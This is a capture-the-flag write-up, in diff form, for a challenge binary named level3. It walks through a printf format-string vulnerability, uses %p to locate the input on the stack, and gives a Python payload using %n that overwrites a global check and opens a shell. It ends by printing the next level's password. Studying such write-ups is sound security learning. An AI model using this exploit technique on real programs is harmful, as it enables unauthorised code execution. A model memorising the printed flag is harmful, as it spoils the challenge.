@@ -1,0 +1,30 @@
+level3 has the same behaviour as the two previous programs. Let's take a deeper look.
+
+main simply calls the function [v]. The [v] function [fgets], which is protected against
+buffer overflow. Too bad.
+It then uses [printf],  on the result of [fgets].
+After that there's a cmp of the address 0x804988c with 0x40 (i.e. 64) and the program exits
+if the result is non-equal. If it is equal, the program runs /bin/sh.
+
+The [printf] is called directly with the user's input, not with a string format specified
+by the developer, like %s. It is therefore vulnerable to an exploit with %n.
+The %n format specifier sends the number of printed characters (before the %n) to a specified variable.
+It seems pretty obvious that we must try to load 64 in 0x804988c.
+
+First I try to understand where in the stack is the program storing the format string.
+
+>./level3
+XXXX %p %p %p %p %p %p %p %p // %p prints an address of a stack element each time. Not accessing it, just printing the address
+XXXX 0x200 0xb7fd1ac0 0xb7ff37d0 0x58585858 [...]
+
+At the fourth variable we find 0x58585858, our first string!
+Now we'll have to write a string that contains the 0x0804988c address, then some padding
+to reach 64 to match the check, and finally, a %n on the fourth element of the stack to store
+the number of printed characters in the address located at the fourth element.
+
+>python -c "print '\x8c\x98\x04\x08' + 'X'*60 + '%4\$n'" > /tmp/level3
+>cat /tmp/level3 - | ./level3
+>Wait what?!
+$>cd ../level4
+$>cat .pass
+$>b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
